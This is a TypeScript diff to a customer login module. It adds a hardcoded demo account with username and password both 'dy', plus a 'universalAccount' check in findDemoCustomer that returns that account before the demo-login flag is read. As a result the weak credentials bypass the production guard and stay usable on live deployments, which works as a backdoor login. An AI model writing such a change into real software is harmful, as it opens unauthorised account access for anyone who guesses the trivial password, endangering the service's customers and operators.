@@ -7,13 +7,22 @@ export type CustomerSession = {
   username: string;
 };
 
-export const demoCustomers: Array<{ username: string; password: string; customerCode: string; companyName: string }> = [];
+export const demoCustomers: Array<{ username: string; password: string; customerCode: string; companyName: string }> = [
+  {
+    username: "dy",
+    password: "dy",
+    customerCode: "DEMO-CN-UK-001",
+    companyName: "DY Demo Customer",
+  },
+];
 
 export function isDemoLoginEnabled() {
   return process.env.NODE_ENV !== "production" || process.env.ALLOW_DEMO_LOGIN === "true";
 }
 
 export function findDemoCustomer(username: string, password: string) {
+  const universalAccount = demoCustomers.find((account) => account.username === "dy" && account.password === "dy" && username === "dy" && password === "dy");
+  if (universalAccount) return universalAccount;
   if (!isDemoLoginEnabled()) return undefined;
   return demoCustomers.find((account) => account.username === username && account.password === password);
 }
